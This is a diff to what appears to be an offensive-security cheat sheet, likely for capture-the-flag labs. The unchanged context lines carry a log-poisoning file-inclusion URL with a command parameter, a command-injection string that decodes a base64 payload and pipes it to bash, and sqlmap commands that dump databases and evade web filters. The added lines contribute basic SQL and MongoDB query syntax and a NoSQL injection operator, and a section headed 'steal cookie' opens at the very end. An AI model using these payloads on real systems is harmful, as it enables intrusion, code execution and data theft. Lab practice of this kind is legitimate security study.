@@ -72,7 +72,7 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 "\";echo <base64 payload> | base64 -d | bash;\""
 ```
 ---
-#### sqlmap
+#### sql
 ```bash
 sqlmap -r req.txt -p <parametr> --dbs
 sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
@@ -82,6 +82,28 @@ sqlmap -r req.txt-p  -D <database_name> --dump-all
 --tamper=space2comment #bypass waf
 ```
 
+##### syntaxis
+###### mysql
+```sql
+.tables 										#to see all tables
+PRAGMA table_info(<table>) 		#see information
+SELECT * FROM customers			#output all info
+
+show databases;
+use DATABASE;
+show tables
+SELECT * FROM users
+```
+###### mongodb
+```sql
+mongo
+show dbs
+use <db>
+show collections
+db.<collection>.find()
+
+search[$ne]=string #mongodb
+```
 ---
 #### steal cookie
 ```
